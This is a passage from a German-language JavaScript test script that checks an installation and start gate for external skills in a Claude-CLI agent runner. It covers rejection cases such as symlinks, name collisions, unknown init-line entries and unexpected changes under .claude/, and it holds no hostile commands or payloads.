    befunde.push(`(a)–(c)/(i)/(k) Vorbereitung gescheitert: ${fehler.stack}`)
  } finally {
    await u.ende()
  }
}

// ─── Rotfälle der Installation (d)–(j) ────────────────────────────────────────
{
  const u = await umgebung()
  try {
    const katalogVorher = () => readFileSync(u.katalogPfad, 'utf8')
    const fall = async (marke, id, status, muster, text) => {
      const vor = befunde.length
      const k0 = katalogVorher()
      const e = await u.installiere(id)
      const letzte = e.installieren ?? e.vorbereiten
      if (letzte.status !== status || !muster.test(letzte.inhalt.grund ?? '')) befunde.push(`${marke} ${id}: erwartet ${status} mit ${muster}, erhalten ${letzte.status} (${letzte.inhalt.grund})`)
      if (e.installieren !== null && e.installieren !== undefined && katalogVorher() !== k0) befunde.push(`${marke} ${id}: ressourcen.json trotz Ablehnung verändert`)
      if (existsSync(join(u.capWurzel, id))) befunde.push(`${marke} ${id}: cap-Ordner blieb liegen`)
      if (befunde.length === vor) console.log(`✓ ${marke} ${text} → ${status}, Klartext-Grund, ressourcen.json bitgleich, kein cap-Ordner.`)
    }
    await fall('(d)', 'ohne-vorlage', 400, /installation_vorlage \(skill_pfad\) fehlt/, 'ohne installation_vorlage')
    await fall('(e)', 'fremde-url', 400, /nur 'https:\/\/github\.com/, 'unbekannte URL-Form (gitlab)')
    await fall('(g)', 'ohne-skillmd', 422, /SKILL\.md fehlt/, 'SKILL.md fehlt')
    await fall('(g)', 'ohne-frontmatter', 422, /kein vollständiges Frontmatter/, 'SKILL.md ohne Frontmatter')
    await fall('(h)', 'mit-symlink', 422, /Symlink im Quellbaum/, 'Symlink im Quellbaum')
    await fall('(i)', 'kollision-eingebaut', 422, /eingebauten Skill/, "Namenskollision mit eingebautem Skill ('loop')")
    await fall('(j)', 'gate-agent', 400, /erst später/, 'extern agent')
    // Ort-B-Kollision: erst gate-skill installieren, dann dup-pack mit name gate-skill.
    const eins = await u.installiere('gate-skill')
    if (eins.installieren?.status !== 200) befunde.push(`(i) gate-skill vor der Ort-B-Kollision nicht installiert: ${JSON.stringify(eins.installieren?.inhalt)}`)
    await fall('(i)', 'kollision-ortb', 422, /anderen Ort-B-Skill/, "Namenskollision mit einem anderen Ort-B-Skill ('gate-skill')")
    // (j) auch Installieren direkt (ohne Vorbereiten) → 400.
    const direkt = await u.post('/api/ressourcen/gate-agent/installation', { version: 'a'.repeat(40), eintragHash: '0'.repeat(64) })
    if (direkt.status !== 400 || !/erst später/.test(direkt.inhalt.grund ?? '')) befunde.push(`(j) Installieren extern agent: ${direkt.status} (${direkt.inhalt.grund})`)

    // (f) SHA nach der Anzeige geändert → 409.
    const vorF = befunde.length
    const u2 = await umgebung()
    try {
      const v = await u2.post('/api/ressourcen/gate-skill/installation/vorbereiten')
      const r = join(REMOTE, 'pack')
      writeFileSync(join(r, 'plugins', 'p', 'skills', 'gate-skill', 'SKILL.md'), `${skillMd('gate-skill')}\nneu\n`)
      git(r, 'add', '-A')
      git(r, 'commit', '-q', '-m', 'neu nach der Anzeige')
      const k0 = readFileSync(u2.katalogPfad, 'utf8')
      const i = await u2.post('/api/ressourcen/gate-skill/installation', { version: v.inhalt.version, eintragHash: v.inhalt.eintragHash })
      if (i.status !== 409 || !/zeigt inzwischen auf/.test(i.inhalt.grund ?? '')) befunde.push(`(f) SHA weicht ab: erwartet 409, erhalten ${i.status} (${i.inhalt.grund})`)
      if (readFileSync(u2.katalogPfad, 'utf8') !== k0 || existsSync(join(u2.capWurzel, 'gate-skill'))) befunde.push('(f) trotz 409 Katalog geändert oder cap-Ordner angelegt')
    } finally {
      await u2.ende()
    }
    if (befunde.length === vorF) console.log('✓ (f) Ref zeigt nach der Anzeige auf eine andere SHA → 409, nichts installiert.')
  } catch (fehler) {
    befunde.push(`(d)–(j) Vorbereitung gescheitert: ${fehler.stack}`)
  } finally {
    await u.ende()
  }
}

// ─── (l) verschachtelte .claude-Ordner → kein Start ────────────────────────────
{
  const vor = befunde.length
  const u = await umgebung()
  try {
    const inst = await u.installiere('gate-skill')
    if (inst.installieren?.status !== 200) throw new Error(`Installation gate-skill: ${JSON.stringify(inst.installieren?.inhalt)}`)
    for (const verschachtelt of [['packages', 'a', '.claude', 'skills', 'nachlade'], ['node_modules', 'x', '.claude', 'agents']]) {
      const pfad = join(u.repoWurzel, ...verschachtelt)
      mkdirSync(pfad, { recursive: true })
      writeFileSync(join(pfad, 'x.md'), '---\nname: x\ndescription: x\n---\n')
      // committet (packages) bzw. per .gitignore (node_modules), damit die Vorbedingung „sauber“ hält.
      if (verschachtelt[0] === 'node_modules') writeFileSync(join(u.repoWurzel, '.gitignore'), 'node_modules/\n')
      git(u.repoWurzel, 'add', '-A')
      git(u.repoWurzel, 'commit', '-q', '-m', verschachtelt.join('/'))
      const s = direkterStart(u, ['gate-skill'])
      const rel = verschachtelt.slice(0, verschachtelt.indexOf('.claude') + 2).join('/')
      if (s.ok || !s.grund.includes(rel)) befunde.push(`(l) ${rel}: Start nicht abgelehnt oder Pfad fehlt im Grund: ${JSON.stringify(s.grund ?? s.ok)}`)
      raeumeVerzeichnis(join(u.repoWurzel, verschachtelt[0]))
      git(u.repoWurzel, 'add', '-A')
      git(u.repoWurzel, 'commit', '-q', '--allow-empty', '-m', 'weg')
    }
    // Über die Freigabe: verschachteltes .claude/skills → kein Start.
    mkdirSync(join(u.repoWurzel, 'docs', '.claude', 'skills'), { recursive: true })
    writeFileSync(join(u.repoWurzel, 'docs', '.claude', 'skills', 'x.md'), 'x')
    git(u.repoWurzel, 'add', '-A')
    git(u.repoWurzel, 'commit', '-q', '-m', 'docs/.claude/skills')
    const wf = await workflowAmZwingendStart(u)
    const freigabe = await u.post(`/api/workflows/${encodeURIComponent(wf.workflowId)}/freigabe`, { schrittId: wf.schrittId, entscheidung: 'FREIGEGEBEN', begruendung: 'Gate', empfehlungIds: (wf.detail.empfehlung?.wirdGenutzt ?? []).map((x) => x.empfehlungId) })
    await new Promise((resolve) => setTimeout(resolve, 300))
    if (u.gesehen.eingaben !== null) befunde.push('(l) Freigabe mit verschachteltem .claude/skills hat einen Lauf gestartet')
    const detail = await (await fetch(`${u.basisUrl}/api/workflows/${encodeURIComponent(wf.workflowId)}`)).json()
    if (!JSON.stringify([freigabe.inhalt, detail]).includes('docs/.claude/skills')) befunde.push(`(l) Grund mit Pfad weder in der Antwort noch im Workflow sichtbar: ${freigabe.status} ${JSON.stringify(freigabe.inhalt)}`)
  } catch (fehler) {
    befunde.push(`(l) Vorbereitung gescheitert: ${fehler.stack}`)
  } finally {
    await u.ende()
  }
  if (befunde.length === vor) console.log('✓ (l) Vorstart-Scan: packages/a/.claude/skills und node_modules/x/.claude/agents (gitignored) → kein Start, Grund mit Pfad; über die Freigabe ebenso (docs/.claude/skills).')
}

// ─── (m) Init-Gate, (n) Laufdiff unter .claude/ — echter fuehreAufgabeDurch ────
{
  const u = await umgebung()
  try {
    const inst = await u.installiere('gate-skill')
    if (inst.installieren?.status !== 200) throw new Error(`Installation gate-skill: ${JSON.stringify(inst.installieren?.inhalt)}`)
    const auftragId = `f36-ws5b-${randomUUID()}`
    registriereAuftrag(auftragId, u.profilReferenz, 'Gate', 'GATE', u.ladeOptionen)
    const basis = direkterStart(u, ['gate-skill'], auftragId)
    if (!basis.ok) throw new Error(`direkter Start: ${basis.grund}`)
    // Startziel/Version/Kontext auf die F4-Fixture (sonst lehnt die Startfreigabe ab); alles andere unverändert.
    const eingaben = { ...basis.eingaben, werkzeugStartziel: [process.execPath], werkzeugVersionDeklariert: UEBRIG.werkzeug_version_deklariert, berechtigungskontext: UEBRIG.berechtigungskontext }
    const initZeile = (felder) => ({ type: 'system', subtype: 'init', tools: ['Bash', 'Edit', 'Read', 'Skill', 'Write'], skills: ['gate-skill'], slash_commands: ['gate-skill', 'clear', 'ponytail'], mcp_servers: [], agents: ['qa'], ...felder })
    const toolUse = { type: 'assistant', message: { content: [{ type: 'tool_use', id: 't1', name: 'Skill', input: { skill: 'gate-skill' } }] }, parent_tool_use_id: null }
    const resultZeile = { type: 'result', subtype: 'success', is_error: false, result: 'ok', permission_denials: [] }
    /** Starter: init melden; bei gesetztem Abbruchsignal ABBRUCH vor dem tool_use, sonst tool_use (+ optional Schreiben unter .claude/) und result. */
    const starter = (init, protokoll, schreibe) => async (_z, _t, o) => {
      o?.beiStreamZeile?.(init)
      if (o?.abbruchSignal?.aborted === true) return { stdout: `${JSON.stringify(init)}\n`, stderr: '', exitCode: null, startfehler: null, beendigungsart: 'ABBRUCH' }
      protokoll.toolUse = true
      o?.beiStreamZeile?.(toolUse)
      if (typeof schreibe === 'function') schreibe(u.repoWurzel)
      else if (schreibe) {
        mkdirSync(join(u.repoWurzel, '.claude', 'skills', 'selbst-angelegt'), { recursive: true })
        writeFileSync(join(u.repoWurzel, '.claude', 'skills', 'selbst-angelegt', 'SKILL.md'), '---\nname: selbst-angelegt\ndescription: x\n---\n')
      }
      o?.beiStreamZeile?.(resultZeile)
      return { stdout: `${[init, toolUse, resultZeile].map((z) => JSON.stringify(z)).join('\n')}\n`, stderr: '', exitCode: 0, startfehler: null, beendigungsart: null }
    }
    const lauf = async (init, schreibe = false) => {
      const protokoll = { toolUse: false }
      const laufId = `f36-ws5b-${randomUUID()}`
      const ergebnis = await fuehreAufgabeDurch(laufId, u.profilReferenz, eingaben, { ...F4_OPTIONEN, basisVerzeichnis: u.basisVerzeichnis, rohBasisVerzeichnis: join(u.basisVerzeichnis, 'roh'), schreiber: STILL, starter: starter(init, protokoll, schreibe) })
      return { ergebnis, protokoll, status: stelleLaufstatusFest(laufId, { basisVerzeichnis: u.basisVerzeichnis }) }
    }
    const vorM = befunde.length
    for (const [text, init, grundMuster] of [
      ['fremder Skill in init.skills', initZeile({ skills: ['gate-skill', 'ponytail'] })],
      ['Agent in init.tools', initZeile({ tools: ['Agent', 'Read', 'Skill'] })],
      ['fremder MCP in init.mcp_servers', initZeile({ mcp_servers: [{ name: 'fremd' }] })],
      // F-831: ein Command aus Nutzer-, Plugin- oder neuer CLI-Quelle wäre per Skill-Werkzeug aufrufbar.
      ['unbekannter Command in init.slash_commands', initZeile({ slash_commands: ['gate-skill', 'clear', 'neuer-command'] }), /init\.slash_commands enthält unbekannte Commands: neuer-command \(Referenzmenge nachmessen\)/],
    ]) {
      const { ergebnis, protokoll, status } = await lauf(init)
      // Der Grund steht in der Terminal-Wirkungsmarke (daten.verstoss aus rohstrom.init_gate_verstoss).
      if (grundMuster !== undefined) {
        const marke = ergebnis.klassifikation?.wirkungsmarke?.pfad !== undefined ? readFileSync(ergebnis.klassifikation.wirkungsmarke.pfad, 'utf8') : ''
        if (!grundMuster.test(marke)) befunde.push(`(m) ${text}: Grund ohne die unbekannten Namen in der Wirkungsmarke: ${marke.slice(0, 400)}`)
      }
      if (protokoll.toolUse) befunde.push(`(m) ${text}: tool_use wurde trotzdem gesendet (kein Abbruch davor)`)
      if (ergebnis.ok !== true || ergebnis.klassifikation.ergebnis !== 'FEHLGESCHLAGEN' || ergebnis.klassifikation.grund !== 'init_gate_verstoss') befunde.push(`(m) ${text}: Klassifikation ${JSON.stringify(ergebnis.klassifikation ?? ergebnis)}`)
      if (status.status !== 'ABGESCHLOSSEN') befunde.push(`(m) ${text}: Laufstatus ${JSON.stringify(status)}`)
    }
    // tool_use vor der init-Zeile bzw. gar keine init-Zeile (Prozess endet regulär).
    const vorInit = { toolUse: false }
    const laufIdVor = `f36-ws5b-${randomUUID()}`
    const ergVor = await fuehreAufgabeDurch(laufIdVor, u.profilReferenz, eingaben, {
      ...F4_OPTIONEN,
      basisVerzeichnis: u.basisVerzeichnis,
      rohBasisVerzeichnis: join(u.basisVerzeichnis, 'roh'),
      schreiber: STILL,
      starter: async (_z, _t, o) => {
        o?.beiStreamZeile?.(toolUse)
        if (o?.abbruchSignal?.aborted === true) return { stdout: `${JSON.stringify(toolUse)}\n`, stderr: '', exitCode: null, startfehler: null, beendigungsart: 'ABBRUCH' }
        vorInit.toolUse = true
        return { stdout: '', stderr: '', exitCode: 0, startfehler: null, beendigungsart: null }
      },
    })
    if (vorInit.toolUse || ergVor.klassifikation?.grund !== 'init_gate_verstoss') befunde.push(`(m) tool_use vor init: ${JSON.stringify(ergVor.klassifikation)}`)
    const ergOhne = await fuehreAufgabeDurch(`f36-ws5b-${randomUUID()}`, u.profilReferenz, eingaben, {
      ...F4_OPTIONEN,
      basisVerzeichnis: u.basisVerzeichnis,
      rohBasisVerzeichnis: join(u.basisVerzeichnis, 'roh'),
      schreiber: STILL,
      starter: async () => ({ stdout: `${JSON.stringify(resultZeile)}\n`, stderr: '', exitCode: 0, startfehler: null, beendigungsart: null }),
    })
    if (ergOhne.klassifikation?.ergebnis !== 'FEHLGESCHLAGEN' || ergOhne.klassifikation.grund !== 'init_gate_verstoss') befunde.push(`(m) ohne init-Zeile nicht rot: ${JSON.stringify(ergOhne.klassifikation)}`)
    const gruen = await lauf(initZeile({}))
    if (gruen.ergebnis.klassifikation?.ergebnis !== 'ERFOLGREICH' || !gruen.protokoll.toolUse) befunde.push(`(m) passende init-Zeile: ${JSON.stringify(gruen.ergebnis.klassifikation)}`)
    if (befunde.length === vorM) console.log('✓ (m) Init-Gate: fremder Skill / Agent in tools / fremder MCP / unbekannter Slash-Command (F-831, Grund im Verstoß) / tool_use vor init → Prozess vor dem ersten tool_use beendet, keine init-Zeile → Verstoß; jeweils FEHLGESCHLAGEN init_gate_verstoss (bestehender Abbruchweg); passende init-Zeile läuft durch.')

    const vorN = befunde.length
    // F-832: git-ignorierte Dateien unter .claude/ — der git-Weg sieht sie nicht, der Dateisystem-
    // Vergleich vor/nach dem Lauf schon. Vor dem Lauf vorhandene, unveränderte settings.local.json → grün.
    writeFileSync(join(u.repoWurzel, '.gitignore'), '.claude/settings.local.json\n.claude/ignoriert/\n')
    writeFileSync(join(u.repoWurzel, '.claude', 'settings.local.json'), '{"permissions":{}}\n')
    const gutIgnoriert = await lauf(initZeile({}))
    if (gutIgnoriert.ergebnis.klassifikation?.ergebnis !== 'ERFOLGREICH') befunde.push(`(n) F-832 Gutfall: vorhandene settings.local.json unverändert, erwartet ERFOLGREICH: ${JSON.stringify(gutIgnoriert.ergebnis.klassifikation)}`)
    const rotIgnoriert = await lauf(initZeile({}), (wurzel) => {
      mkdirSync(join(wurzel, '.claude', 'ignoriert'), { recursive: true })
      writeFileSync(join(wurzel, '.claude', 'ignoriert', 'neu.md'), 'x')
    })
    const k = rotIgnoriert.ergebnis.klassifikation
    if (k?.ergebnis !== 'FEHLGESCHLAGEN' || k.grund !== 'claude_ordner_veraendert') befunde.push(`(n) F-832 Rotfall: gitignorierte neue Datei unter .claude/ nicht rot: ${JSON.stringify(k)}`)
    raeumeVerzeichnis(join(u.repoWurzel, '.claude', 'ignoriert'))
    const rot = await lauf(initZeile({}), true)
    if (rot.ergebnis.klassifikation?.ergebnis !== 'FEHLGESCHLAGEN' || rot.ergebnis.klassifikation.grund !== 'claude_ordner_veraendert') befunde.push(`(n) .claude-Änderung im Laufdiff nicht rot: ${JSON.stringify(rot.ergebnis.klassifikation)}`)
    if (befunde.length === vorN) console.log('✓ (n) Laufdiff mit neuer Datei unter .claude/skills/ → FEHLGESCHLAGEN claude_ordner_veraendert (bestehender Bewertungsweg klassifiziereLauf); F-832: git-ignorierte neue Datei unter .claude/ → ebenso rot, vorhandene unveränderte settings.local.json → ERFOLGREICH.')
  } catch (fehler) {
    befunde.push(`(m)/(n) Vorbereitung gescheitert: ${fehler.stack}`)
  } finally {
    await u.ende()
  }
}

// ─── (o) ohne Ort-B-Skill bitgenau wie heute; ortB im Body abgelehnt ──────────
{
  const vor = befunde.length
  const u = await umgebung()
  try {
    const ohne = loeseAusfuehrungsEingabenAuf({ rolle: 'ausfuehrung', anfragen: [], budget: {}, aufrufEingaben: { modell: 'claude-sonnet-5' }, auftragId: 'x' }, 'schreibend', 'GATE', vorlage, u.repoWurzel, {})
    const leer = loeseAusfuehrungsEingabenAuf({ rolle: 'ausfuehrung', anfragen: [], budget: {}, aufrufEingaben: { modell: 'claude-sonnet-5' }, auftragId: 'x' }, 'schreibend', 'GATE', vorlage, u.repoWurzel, { skillEintraege: [] })
    if (!ohne.ok || JSON.stringify(ohne) !== JSON.stringify(leer)) befunde.push('(o) leere skillEintraege ändern die Eingaben')
    if (ohne.ok) {
      if ('ortBLauf' in ohne.eingaben || 'ortB' in ohne.eingaben.aufrufEingaben || 'disallowedTools' in ohne.eingaben.aufrufEingaben) befunde.push(`(o) Zusatzfelder ohne Ort-B-Skill: ${JSON.stringify(ohne.eingaben.aufrufEingaben)}`)
      if (JSON.stringify(ohne.eingaben.aufrufEingaben.werkzeugsatz.erlaubte_werkzeuge) !== JSON.stringify(vorlage.werkzeugsaetze.schreibend.erlaubte_werkzeuge)) befunde.push('(o) Werkzeugsatz ohne Ort-B-Skill verändert')
      const tokens = baueAufruf({ ...ohne.eingaben.aufrufEingaben, prompt: 'GATE' })
      if (tokens.includes('--add-dir') || tokens.includes('--settings') || flag(tokens, '--tools').split(',').includes('Skill') || flag(tokens, '--disallowedTools') !== 'Bash(git:*)') befunde.push(`(o) Tokens ohne Ort-B-Skill verändert: ${JSON.stringify(tokens.slice(0, -1))}`)
    }
    // Eine andere Rolle bekommt die Skills nie (erhaeltKatalogFaehigkeiten).
    const inst = await u.installiere('gate-skill')
    const aufgeloest = loeseRessourcenAuf(JSON.parse(readFileSync(u.katalogPfad, 'utf8')).ressourcen, u.repoWurzel, u.startvorlagePfad)
    const lesend = loeseAusfuehrungsEingabenAuf({ rolle: 'qa', anfragen: [], budget: {}, aufrufEingaben: { modell: 'claude-sonnet-5' }, auftragId: 'x' }, 'lesend', 'GATE', vorlage, u.repoWurzel, { skillEintraege: [aufgeloest.find((r) => r.id === 'gate-skill')], capWurzel: u.capWurzel })
    if (inst.installieren?.status !== 200 || !lesend.ok || 'ortB' in lesend.eingaben.aufrufEingaben || 'ortBLauf' in lesend.eingaben) befunde.push('(o) Rolle qa/lesend bekommt Ort-B-Skills')
    const body = await u.post('/api/laeufe', { laufId: `f36-ws5b-${randomUUID()}`, rolle: 'ausfuehrung', anfragen: [], budget: {}, aufrufEingaben: { modell: 'claude-sonnet-5', ortB: { addDirs: ['C:\\x'], settings: '{}' } }, werkzeugsatz: 'schreibend', auftragId: 'x' })
    if (body.status !== 400 || !/aufrufEingaben\.ortB/.test(body.inhalt.grund ?? '')) befunde.push(`(o) aufrufEingaben.ortB im Body: erwartet 400, erhalten ${body.status} (${body.inhalt.grund})`)
  } catch (fehler) {
    befunde.push(`(o) Vorbereitung gescheitert: ${fehler.stack}`)
  } finally {
    await u.ende()
  }
  if (befunde.length === vor) console.log("✓ (o) Ohne Ort-B-Skill bitgenau wie heute (kein ortB/ortBLauf/disallowedTools-Zusatz, Werkzeugsatz und Tokens unverändert); andere Rollen bekommen nie Skills; aufrufEingaben.ortB im Body → 400.")
}

if (befunde.length > 0) {
  console.error(`\n✗ ${befunde.length} Befund(e):`)
  for (const befund of befunde) console.error(`  - ${befund}`)
  process.exit(1)
}
console.log('\n✓ F36-WS-5b-Skill-Check sauber.')
